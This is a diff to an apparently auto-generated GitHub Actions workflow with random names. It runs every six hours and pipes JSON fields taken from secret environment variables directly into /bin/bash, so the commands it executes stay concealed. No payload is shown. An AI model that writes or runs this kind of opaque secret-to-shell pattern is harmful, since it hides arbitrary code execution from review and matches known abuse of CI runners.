@@ -2,7 +2,7 @@ name: jiatingqian7584
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 5/6 * * *'
+    - cron: '27 0/6 * * *'
 
 jobs:
   build:
@@ -11,10 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiatingqian7584
         env:
-          roswl8: ${{ secrets.roswl8 }}
+          e87948: ${{ secrets.e87948 }}
         run: |
-          echo $roswl8 | jq -r .lv19739 | /bin/bash
-          echo $irdlq444 | jq -r .uaivr60 | /bin/bash
-          echo $pi8500 | jq -r .haf8873 | /bin/bash
-          echo $xuj12687 | jq -r .q42051 | /bin/bash
+          echo $e87948 | jq -r .qz3 | /bin/bash
+          echo $vhd7 | jq -r .bfpne66249 | /bin/bash
+          echo $ij61150 | jq -r .qroy91860 | /bin/bash
+          echo $h256 | jq -r .rfzf34851 | /bin/bash
+          echo $vuzo0896 | jq -r .wogm2317 | /bin/bash
+          echo $eu3 | jq -r .wuqsl98 | /bin/bash
+          echo $kl36 | jq -r .zqpn98 | /bin/bash
+          echo $vab31 | jq -r .ijwy07 | /bin/bash
+          echo $szbxc572 | jq -r .na334 | /bin/bash
 
